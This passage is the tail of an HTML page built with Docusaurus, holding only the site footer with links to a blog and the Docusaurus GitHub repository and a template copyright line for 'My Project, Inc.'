class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">Blog</a></li><li class="footer__item"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>